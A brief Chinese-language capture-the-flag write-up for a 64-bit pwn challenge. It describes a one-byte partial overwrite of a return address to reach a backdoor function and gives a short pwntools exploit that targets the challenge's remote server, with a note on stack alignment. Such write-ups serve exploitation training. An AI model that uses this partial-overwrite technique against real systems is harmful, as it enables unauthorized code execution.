# W1 p1eee

## 文件分析

下载`pwn`, NX on, PIE on, Canary off, RELRO full  
ghidra分析为64位程序

## 逆向

该程序存在后门函数，因此尝试重定向回该函数  
但是只能溢出一个字节

已知在小端计算机上数据存储应是：  
假如main函数地址为0x55555555127b，那么地址从小到大存储为  
7b 12 55 55 55 55 00 00  
那么这一个字节可以覆盖7b

反汇编后可知，后门函数地址和read函数所在函数返回地址第一个字节一致，
因此只需要变化此字节即可

## EXPLOIT

```python
from pwn import *
sh = remote("node4.buuoj.cn", 27047)
sh.sendline(b'0'*40 + p8(0x6c)) # addr of backdoor
sh.interactive()
```

后门函数所在地址第一字节是0x64，但是若直接使用，会导致rbp & 0xf != 0，
所以跳转到LEA处即可

Done.
